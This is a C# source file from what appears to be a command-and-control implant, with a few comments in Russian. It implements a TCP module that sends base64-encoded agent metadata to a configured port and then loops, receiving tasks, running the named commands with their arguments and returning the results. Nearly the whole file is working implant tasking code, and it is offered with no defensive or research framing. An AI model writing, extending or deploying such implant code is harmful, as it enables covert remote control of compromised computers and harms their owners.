using Implant.Commands;
using Implant.Models;
using Implant.Services;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Implant.CommunicationModule
{
    public class TcpCommunicationModule : CommunactionModule
    {
        public override string BindHost => "localhost";

        public override string BindPort => Config.BindPort;

        public override string Type => "TCP";

        private TcpClient tcpClient;
        private CancellationTokenSource _tokenSource;

        public override async Task SendRequest(AgentMetadata agentMetadata)
        {
            int port = int.Parse(BindPort);

            using (tcpClient = new TcpClient())
            {
				tcpClient.Connect(BindHost, port);

				_tokenSource = new CancellationTokenSource();

				string base64String = Convert.ToBase64String(agentMetadata.Serialise());

				if (tcpClient.Connected)
				{
                    SendMessage(tcpClient, base64String);

					while (!_tokenSource.IsCancellationRequested)
					{
						var result = ReceiveMessage(tcpClient);
						if (!string.IsNullOrEmpty(result))
						{
							var json = Encoding.UTF8.GetString(Convert.FromBase64String(result));
							AgentTaskResult agentTaskResult = await CheckCommands(json);
							if (agentTaskResult is null)
								continue;

							string base64TaskResult = Convert.ToBase64String(agentTaskResult.Serialise());

							SendMessage(tcpClient, base64TaskResult);
						}
                        continue;
					}
				}
			}
        }

        private string ReceiveMessage(TcpClient client)
        {
            NetworkStream stream = client.GetStream();

            const int initialBufferSize = 1024; // начальный размер буфера
            byte[] buffer = new byte[initialBufferSize];
            int bytesRead;

            using (MemoryStream memoryStream = new MemoryStream())
            {
                do
                {
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead > 0)
                    {
                        memoryStream.Write(buffer, 0, bytesRead);

                        if (bytesRead == buffer.Length)
                        {
                            // Размер буфера исчерпан, увеличиваем его размер
                            byte[] newBuffer = new byte[buffer.Length * 2];
                            Array.Copy(buffer, newBuffer, bytesRead);
                            buffer = newBuffer;
                        }
                    }
                }
                while (stream.DataAvailable);

                byte[] data = memoryStream.ToArray();
                string dataAsString = Encoding.UTF8.GetString(data);
                return dataAsString;
            }
        }

        private void SendMessage(TcpClient client, string message)
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = Encoding.ASCII.GetBytes(message);
            stream.Write(buffer, 0, buffer.Length);
        }

        private async Task<AgentTaskResult> CheckCommands(string agentTask)
        {

            byte[] jsonBytes = System.Text.Encoding.UTF8.GetBytes(agentTask);
            AgentTask agentTasks = jsonBytes.Deserialize<AgentTask>();

            List<Command> commands = CommandsList.GetCommands();


            var command = commands.FirstOrDefault(c => c.Name.Equals(agentTasks.Command, StringComparison.OrdinalIgnoreCase));
            if (command is null)
            {
                    
                return new AgentTaskResult
                {
                    Result = "Command not found",
                    AgentId = agentTasks.AgentId,
                    TaskId = agentTasks.Id
                };
            }
            if (agentTasks.Command == "disconnect")
            {
                Stop();
            }
            try
            {
                var result = command.Execute(agentTasks.Id, agentTasks.AgentId, agentTasks.Arguments);
                return result;
            }
            catch( Exception e)
            {
                return new AgentTaskResult
                {
                    Result = e.ToString(),
                    AgentId = agentTasks.AgentId,
                    TaskId = agentTasks.Id
                };
            }

        }

        
        private void Stop()
        {
            _tokenSource.Cancel();
        }
    }
}
